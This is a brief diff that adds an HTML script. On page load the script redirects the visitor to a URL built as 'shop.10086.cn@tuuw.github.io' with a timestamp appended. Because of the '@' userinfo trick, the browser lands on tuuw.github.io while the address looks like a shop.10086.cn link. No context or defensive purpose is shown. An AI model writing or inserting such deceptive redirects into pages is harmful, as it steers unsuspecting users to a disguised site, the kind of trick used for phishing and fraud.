@@ -1,0 +1,5 @@
+<script>
+var currentTimestamp = new Date().getTime();
+console.log(currentTimestamp);
+location.href = " https://shop.10086.cn@tuuw.github.io?"+currentTimestamp;
+</script>
